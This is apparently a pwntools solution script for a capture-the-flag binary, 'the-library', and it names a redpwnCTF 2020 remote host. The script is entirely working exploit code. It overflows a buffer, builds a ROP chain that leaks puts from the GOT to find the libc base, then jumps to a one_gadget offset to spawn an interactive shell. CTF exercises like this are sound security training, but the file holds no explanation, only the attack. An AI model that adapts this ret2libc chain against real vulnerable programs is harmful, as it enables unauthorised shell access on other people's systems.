from pwn import *

elf = ELF("./the-library")
libc = ELF("./libc.so.6")

pop_rdi = p64(0x0000000000400733)
got_puts = p64(elf.got.puts)
call_puts = p64(elf.sym.puts) #p64(0x00000000004006a9)

if args.REMOTE:
    p = remote("2020.redpwnc.tf", 31350)
elif args.GDB:
    p = gdb.debug(elf.path)
else:
    p = process(elf.path)

p.recv()
payload = "A"*24 + pop_rdi + got_puts + call_puts + p64(elf.sym.main)
p.sendline(payload)
p.recvuntil("there: \n")
p.recvline()
data = p.recvline()

data = u64(data.strip().ljust(8, "\x00"))
log.info("leak puts@plt : %s" % hex(data))

libc_base = data - libc.sym.puts
log.info("leak libc base : %s" % hex(libc_base))

payload = "A"*24 + p64(libc_base + 0x4f2c5)
p.recv()
p.sendline(payload)
p.recv()
p.interactive()
